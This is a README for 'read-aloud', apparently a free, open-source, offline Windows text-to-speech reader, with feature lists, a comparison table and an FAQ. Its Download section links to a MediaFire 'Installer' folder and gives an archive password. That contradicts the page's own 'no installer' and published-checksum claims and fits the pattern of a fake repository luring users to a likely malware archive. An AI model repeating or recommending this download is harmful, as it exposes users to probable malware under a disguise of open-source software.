# read-aloud

🗣️ Free, open-source text-to-speech reader for Windows — narrate documents and clipboard with SAPI voices offline. 100 MB portable, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Reads real documents** — opens TXT, EPUB, DOCX and PDF text, keeps reading position per file
- ✅ **Clipboard hotkey** — Win+Alt+S narrates whatever was just copied, then returns to what you were doing
- ✅ **Sentence highlighting** — the current sentence is highlighted in the text pane while it is spoken
- ✅ **Voice and speed control** — any installed SAPI voice, 0.5x to 3x rate, pitch and volume per document
- ✅ **Export to audio** — renders a document to WAV or MP3 in the background for commutes
- ✅ **Offline by design** — no cloud voices, no network, no account; your documents stay local
- ✅ **100 MB self-contained exe** — runtime bundled, portable, MIT with SHA-256 releases

## Why read-aloud

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB exe - no installer, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **read-aloud** | Balabolka | NaturalReader | Windows Narrator |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Free | Freemium | Built-in |
| Open source | **Yes** | No | No | No |
| EPUB and DOCX support | **Yes** | Yes | DOCX only | No |
| Offline with SAPI voices | **Yes** | Yes | Cloud voices | Yes |
| Audio export WAV and MP3 | **Yes** | Yes | Paid tier | No |
| Portable, no install | **Yes, 100 MB** | Zip | Web or app | With OS |

## FAQ

**how to make Windows read text out loud for free?**

Narrator is built for screen control, not for reading a document to you, and cloud readers stop the moment the connection does. read-aloud uses the SAPI voices already on the machine, tracks your position per file, and can render long documents to MP3 offline. It is a 100 MB portable exe under MIT, no account, no telemetry.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark reader (#121417, warm amber #FBBF24): text pane with sentence highlight, voice dropdown Microsoft David, rate slider at 1.4x.
2. Library and position view: recent documents with progress bars, five-minute-rule timer chip, resume banner on one EPUB.
3. Export panel: WAV and MP3 options, chapter split toggle, queue of two documents rendering, output folder and bitrate fields.

## Download

| Source | Link |
|---|---|
| 💾 **Installer read-aloud** | [Installer read-aloud](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).